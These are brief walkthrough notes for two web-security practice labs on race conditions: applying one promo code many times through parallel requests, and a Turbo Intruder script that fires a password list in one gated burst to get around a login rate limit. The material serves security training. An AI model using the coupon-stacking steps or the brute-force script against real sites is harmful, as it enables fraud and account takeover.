# Lab: Limit overrun race conditions

Login -> Home -> Go to 'Lightweight L33t Leather Jacket' product -> Add to cart -> Apply the given promo code and capture that request in burp -> Remove that coupon now -> Send the captured request to repeater -> Create a new group -> duplicate that request 26 time -> Send in parallel -> See the price is below 50 -> Buy


# Lab: Bypassing rate limits via race conditions

Try to Login using username carlos & random pass -> capture that request -> send to repeater -> right click - extension - select turbo intruder send -> Use this script:
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    passwords = [
  "123123",
  "abc123",
  ----,
  ----,
  "121212",
  "000000"
]
    for p in passwords:
        engine.queue(target.req, p, gate='race1')
    engine.openGate('race1')
def handleResponse(req, interesting):
    table.add(req)
```
Also change the password field to `%s` (csrf=3IVGwulZFXdIU2noBQmgP9U2dTug3eDn&username=carlos&password=%s) -> Attack -> You will get one 302 request


